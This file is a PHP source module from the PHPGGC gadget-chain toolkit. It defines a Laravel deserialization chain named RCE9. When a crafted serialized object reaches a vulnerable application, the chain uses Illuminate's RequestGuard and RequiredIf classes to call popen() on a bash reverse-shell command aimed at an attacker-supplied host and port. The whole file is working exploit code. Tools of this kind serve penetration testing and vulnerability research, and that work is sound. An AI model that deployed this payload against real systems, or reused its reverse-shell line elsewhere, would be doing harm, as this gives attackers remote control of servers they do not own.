<?php

namespace GadgetChain\Laravel;

class RCE9 extends \PHPGGC\GadgetChain\RCE\Command
{
    public static $version = '*';
    public static $vector = '__toString';
    public static $author = 'Arjun Shibu (twitter.com/0xsegf)';
    public static $information = 'Opens a reverse shell connection through call to popen().';
    public static $parameters = ['host', 'port'];

    public function generate(array $parameters)
    {
        $host = $parameters['host'];
        $port = $parameters['port'];

        $revshell = "bash -c \"bash -i >& /dev/tcp/$host/$port 0>&1\"";
        $guard = new \Illuminate\Auth\RequestGuard('popen', $revshell, 'r');
        $userfn = [$guard, 'user'];
        $requiredif = new \Illuminate\Validation\Rules\RequiredIf($userfn);

        return $requiredif;
    }
}
